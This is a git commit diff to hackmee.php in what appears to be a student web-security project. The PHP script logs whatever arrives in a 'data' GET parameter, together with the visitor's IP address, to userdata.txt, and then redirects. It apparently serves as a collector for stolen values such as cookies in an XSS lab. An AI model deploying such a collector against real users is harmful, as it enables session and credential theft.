22473309fdbca59a6505603bb2e7f592bf17708e
mohamedrajhi <40335054+mohamedrajhi@users.noreply.github.com>
2020-04-03 17:15:44 +0200

    Update hackmee.php

--- Projet_web_sec/hackmee.php
+++ Projet_web_sec/hackmee.php
@@ -1,7 +1,9 @@
 <?php
+   include("Config.php");
+
    $data=$_GET['data']. "| {$_SERVER['REMOTE_ADDR']}";
 
    file_put_contents('userdata.txt',$data. PHP_EOL , FILE_APPEND | LOCK_EX);
-   header("location: http://localhost/Projet_web_sec/welcome.php")
+   header("location: welcome.php")
    
 ?>
